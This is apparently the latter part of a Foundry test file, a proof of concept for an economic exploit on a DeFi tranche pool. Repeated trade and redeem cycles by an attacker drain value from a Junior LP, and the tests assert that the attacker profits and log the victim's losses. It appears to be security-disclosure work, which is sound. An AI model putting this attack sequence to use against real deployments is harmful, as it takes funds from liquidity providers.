        r.daysElapsed = (vm.getBlockTimestamp() - t0) / 1 days;
        int256 tA = int256(_wealth(PROTOCOL_TREASURY_ACCOUNT));
        int256 sA = int256(_seniorValue());
        int256 kA = int256(_wealth(K2));
        vm.revertToState(snap);
        w = deposit;
        (, int256 hSum) = _run(false, r.cycles, false);
        r.victimHonest = _victimValue();
        r.attackerGain = aSum - hSum;
        r.attackerAbsolute = aSum;
        r.treasuryGain = tA - int256(_wealth(PROTOCOL_TREASURY_ACCOUNT));
        r.seniorGain = sA - int256(_seniorValue());
        r.settlerGain = kA - int256(_wealth(K2));
        int256 loss = int256(r.victimHonest) - int256(r.victimAttacked);
        console.log("W (USDG atoms) / confidence (1/100 bp)", deposit, confCbp);
        console.log("cycles / elapsed days", r.cycles, r.daysElapsed);
        console.log("victim value: start / end of honest run / end of attack run (USDG atoms)");
        console.log(r.victimStart, r.victimHonest, r.victimAttacked);
        console.log("victim loss (USDG atoms) / bps of its 10M holding");
        console.logInt(loss);
        console.logInt(loss * 10_000 / int256(JUNIOR));
        console.log("attacker net gain after all fees vs honest (USDG atoms)");
        console.logInt(r.attackerGain);
        console.log("attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)");
        console.logInt(aSum);
        console.log("attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)");
        console.logInt(r.legCost);
        console.log(r.legFees);
        console.log("value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed");
        console.logInt(r.treasuryGain);
        console.logInt(r.seniorGain);
        console.logInt(r.settlerGain);
        console.logInt(loss - r.attackerGain - r.treasuryGain - r.seniorGain - r.settlerGain);
    }

    // ------------------------------------------------------------------ tests

    /// @notice Main: W = 1 x incumbent Junior, 30 back-to-back weekday cycles (about 3.75 days; the log prints whole days), 3 bp confidence.
    ///         Extrapolation: the per-cycle loss is roughly constant until the covenant floor, so 120 cycles
    ///         (about 21 days of weekdays) give about 4x this loss (see test_02_W1x_120Cycles).
    function test_01_W1x_30Cycles() public {
        vm.pauseGasMetering();
        Result memory r = _differential(JUNIOR, 30);
        assertEq(r.cycles, 30, "all 30 cycles ran");
        assertGt(r.victimHonest - r.victimAttacked, JUNIOR / 100, "victim loses > 1 % of its Junior principal");
        assertGt(r.attackerGain, 0, "attacker profits after fees and confidence shift");
        assertEq(engine.lastMarkPrice(), PRICE, "no price move");
    }

    /// @notice Full 120-cycle run of the main scenario (slow; may be skipped with --no-match-test).
    function test_02_W1x_120Cycles() public {
        vm.pauseGasMetering();
        Result memory r = _differential(JUNIOR, 120);
        assertGt(r.victimHonest - r.victimAttacked, JUNIOR / 10, "victim loses > 10 % of its Junior principal");
        assertGt(r.attackerGain, 0, "attacker profits after fees and confidence shift");
    }

    /// @notice W = 5 x incumbent Junior until the Junior covenant floor (Junior >= Senior x 2000/8000) stops the
    ///         attacker's own exit. The floor bounds the drain at 1 - S/(4J) of incumbent Junior (25 % here).
    function test_03_W5x_UntilCovenantFloor() public {
        vm.pauseGasMetering();
        uint256 s0 = vm.snapshotState();
        Result memory r = _differential(5 * JUNIOR, 200);
        assertGt(r.cycles, 10, "drain ran");
        assertGt(r.victimHonest - r.victimAttacked, JUNIOR * 20 / 100, "victim loses > 20 % of its Junior principal");
        assertGt(r.attackerGain, 0, "attacker profits after fees and confidence shift");
        // replay the attack path to the floor: the documented Junior covenant now holds the remaining Junior in place
        vm.revertToState(s0);
        w = 5 * JUNIOR;
        _run(true, 200, true);
        _skipWeekend();
        uint256 ask = juniorVault.balanceOf(VICTIM) / 10;
        vm.prank(VICTIM);
        uint256 rid = juniorVault.requestRedeem(ask, VICTIM, VICTIM);
        _warpTo(rid * 1 hours);
        // the only matured item has zero covenant capacity, so settlement reverts HousePool__NoLpEpochProgress
        (bool progressed,) = address(this).call(abi.encodeCall(this.settleExt, ()));
        console.log("settlement made progress at the floor", progressed ? 1 : 0);
        console.log("victim asks to redeem 10 % of its shares at the floor: claimable / still pending",
            juniorVault.claimableRedeemRequest(rid, VICTIM), juniorVault.pendingRedeemRequest(rid, VICTIM));
        console.log("junior principal / senior principal", pool.juniorPrincipal(), pool.seniorPrincipal());
        assertEq(juniorVault.claimableRedeemRequest(rid, VICTIM), 0, "covenant floor reached");
        assertEq(juniorVault.pendingRedeemRequest(rid, VICTIM), ask, "whole request still pending");
    }

    /// @notice Senior = Junior (S/J = 1), the seed ratio of the Arbitrum Sepolia testnet deployment.
    ///         The Senior LP first redeems two thirds of its shares through the vault, leaving 10 M Senior against
    ///         10 M Junior. Then W = 1 / 2 / 3 x incumbent Junior, up to 120 cycles each, no other traders. The
    ///         covenant floor is S/4 = 2.5 M, so up to 75 % of incumbent Junior is drainable.
    function test_04_SeniorEqualsJunior() public {
        vm.pauseGasMetering();
        _warpTo(vm.getBlockTimestamp() + 1 hours); // TrancheVault.DEPOSIT_COOLDOWN
        _skipWeekend();
        uint256 sh = seniorVault.balanceOf(SENIOR_LP) * 2 / 3;
        vm.prank(SENIOR_LP);
        uint256 rid = seniorVault.requestRedeem(sh, SENIOR_LP, SENIOR_LP);
        _warpTo(rid * 1 hours);
        _settle();
        uint256 c = seniorVault.claimableRedeemRequest(rid, SENIOR_LP);
        vm.prank(SENIOR_LP);
        seniorVault.claimRedeem(rid, c, SENIOR_LP, SENIOR_LP);
        console.log("senior principal / junior principal", pool.seniorPrincipal(), pool.juniorPrincipal());
        uint256 s0 = vm.snapshotState();
        uint256[3] memory ws = [JUNIOR, 2 * JUNIOR, 3 * JUNIOR];
        for (uint256 i = 0; i < ws.length; ++i) {
            vm.revertToState(s0);
            _differential(ws[i], 120);
        }
    }


    /// @notice Capital threshold with no other traders: W = 0.5 / 0.75 / 1 / 2 x incumbent Junior, 30 cycles each.
    ///         A cycle that is not profitable is never run (rational stop), so 0 cycles means below break-even.
    function test_05_CapitalThreshold() public {
        vm.pauseGasMetering();
        uint256 s0 = vm.snapshotState();
        uint256[4] memory ws = [JUNIOR / 2, JUNIOR * 3 / 4, JUNIOR, 2 * JUNIOR];
        Result memory r;
        for (uint256 i = 0; i < ws.length; ++i) {
            vm.revertToState(s0);
            r = _differential(ws[i], 30);
            if (i == 0) assertEq(r.cycles, 0, "W 0.5x is below break-even without other skew");
            if (i >= 2) assertEq(r.cycles, 30, "W >= 1x runs every cycle");
        }
    }

    /// @notice Confidence sweep, 30 cycles each. W = 1 x at 0 / 1 / 2 / 3 / 3.5 / 4 bp basket confidence locates the
    ///         break-even and, at 0 bp, checks that the trade legs cost only the execution fees; W = 2 x and 5 x at 9 bp (just under the 10 bp oracle ceiling) show the worst case.
    function test_07_ConfidenceSweep() public {
        vm.pauseGasMetering();
        uint256 s0 = vm.snapshotState();
        uint16[6] memory cs = [uint16(0), 100, 200, 300, 350, 400];
        for (uint256 i = 0; i < cs.length; ++i) {
            vm.revertToState(s0);
            confCbp = cs[i];
            Result memory r = _differential(JUNIOR, 30);
            if (i == 0) {
                // with no confidence shift the trade legs cost only the two execution fees, plus carry for the
                // minutes the position is open: the VPI charge comes back in full and no rebate beyond it is paid
                assertGe(r.legCost, int256(r.legFees), "trade legs cost at least the two fees");
                assertLe(r.legCost - int256(r.legFees), int256(r.legFees / 1000), "VPI nets to zero (within 0.1 % of fees)");
            }
        }
        // snapshots also restore test-contract storage, so set the confidence after each revert
        vm.revertToState(s0);
        confCbp = 900;
        _differential(2 * JUNIOR, 30);
        vm.revertToState(s0);
        confCbp = 900;
        _differential(5 * JUNIOR, 30);
    }

    /// @dev An unrelated trader opens a LONG of `kPct` % of the economic depth the pool will have once the attacker's
    ///      deposit `deposit` is in. It is opened before the snapshot, so it exists in both paths.
    function _openCrowd(
        uint256 deposit,
        uint256 kPct
    ) internal returns (uint256 lots) {
        lots = (_depth() + deposit) * kPct / 100 / LOT_NOTIONAL;
        _depositTrader(CROWD, lots * LOT_NOTIONAL / 5);
        _trade(CROWD, lots, lots * LOT_NOTIONAL / 10, false);
    }

    /// @notice Natural-skew sweep at 3 bp, 30 cycles each: third-party skew K = 20 / 30 / 35 % of depth x
    ///         W = 0.25 / 0.33 / 0.4 / 0.5 x incumbent Junior. A cycle pays when
    ///         s C > (8 bp + (2 - s) d) n + s Senior coupon 2 h, with C/n = vpiFactor (0.38 + K) / 2, d = 0.75 bp.
    function test_06_NaturalSkewSweep() public {
        vm.pauseGasMetering();
        uint256 s0 = vm.snapshotState();
        uint8[3] memory ks = [uint8(20), 30, 35];
        uint256[4] memory ws = [JUNIOR / 4, JUNIOR / 3, JUNIOR * 2 / 5, JUNIOR / 2];
        for (uint256 i = 0; i < ks.length; ++i) {
            for (uint256 j = 0; j < ws.length; ++j) {
                vm.revertToState(s0);
                console.log("third-party skew (% of depth)", ks[i]);
                _openCrowd(ws[j], ks[i]);
                _differential(ws[j], 30);
            }
        }
    }

    /// @notice No attacker: an ordinary Junior LP redeems while an unrelated trader's skew-increasing LONG (38 % of
    ///         depth) is open, and the trader later closes at the same price. Compared with the same LP redeeming
    ///         after the close, it is paid part of the open charge that the close then takes back from the LPs who
    ///         stay. In the redeem-first path the trader also holds its position about an hour longer, so it pays
    ///         more carry to the pool, which favours the LPs who stay; the measured transfer is therefore a lower bound.
    function test_08_PassiveExitDuringOpenSkew() public {
        vm.pauseGasMetering();
        _join(juniorVault, LP2, JUNIOR / 2);
        _warpTo(vm.getBlockTimestamp() + 1 hours); // TrancheVault.DEPOSIT_COOLDOWN
        _skipWeekend();
        uint256 lots = _openCrowd(0, 38);
        uint256 sh = juniorVault.balanceOf(LP2);
        uint256 s0 = vm.snapshotState();

        // LP2 exits while the position is open, then the trader closes
        vm.prank(LP2);
        uint256 rid = juniorVault.requestRedeem(sh, LP2, LP2);
        _warpTo(rid * 1 hours);
        _settle();
        uint256 c = juniorVault.claimableRedeemRequest(rid, LP2);
        vm.prank(LP2);
        uint256 outDuring = juniorVault.claimRedeem(rid, c, LP2, LP2);
        _trade(CROWD, lots, 0, true);
        uint256 victimDuring = _victimValue();

        // LP2 exits after the trader closes
        vm.revertToState(s0);
        _trade(CROWD, lots, 0, true);
        vm.prank(LP2);
        rid = juniorVault.requestRedeem(sh, LP2, LP2);
        _warpTo(rid * 1 hours);
        _settle();
        c = juniorVault.claimableRedeemRequest(rid, LP2);
        vm.prank(LP2);
        uint256 outAfter = juniorVault.claimRedeem(rid, c, LP2, LP2);
        uint256 victimAfter = _victimValue();

        console.log("passive LP (5 M Junior) proceeds: exit while open / exit after close", outDuring, outAfter);
        console.log("remaining Junior LP (10 M) value: when the other exits while open / after close",
            victimDuring, victimAfter);
        assertGt(outDuring, outAfter, "exiting while the skew is open pays out part of a refundable charge");
        assertLt(victimDuring, victimAfter, "the LP who stays pays for it");
    }

    /// @notice No attacker: an ordinary depositor's Junior deposit activates while an unrelated trader's
    ///         skew-increasing LONG (38 % of depth) is open, and the trader then closes at the same price. Compared
    ///         with depositing after the close, the depositor buys shares at a price that includes a charge the close
    ///         then takes back.
    function test_09_PassiveEntryDuringOpenSkew() public {
        vm.pauseGasMetering();
        _warpTo(vm.getBlockTimestamp() + 1 hours);
        _skipWeekend();
        uint256 lots = _openCrowd(0, 38);
        uint256 amount = JUNIOR / 2;
        uint256 s0 = vm.snapshotState();

        // LP3's deposit activates while the position is open, then the trader closes
        uint256 sh = _join(juniorVault, LP3, amount);
        _trade(CROWD, lots, 0, true);
        uint256 valueDuring = juniorVault.convertToAssets(sh);

        // LP3 deposits after the trader closes
        vm.revertToState(s0);
        _trade(CROWD, lots, 0, true);
        sh = _join(juniorVault, LP3, amount);
        uint256 valueAfter = juniorVault.convertToAssets(sh);

        console.log("depositor (5 M Junior) value after the close: entered while open / entered after close",
            valueDuring, valueAfter);
        assertLt(valueDuring, valueAfter, "entering while the skew is open overpays for a refundable charge");
    }
}
```

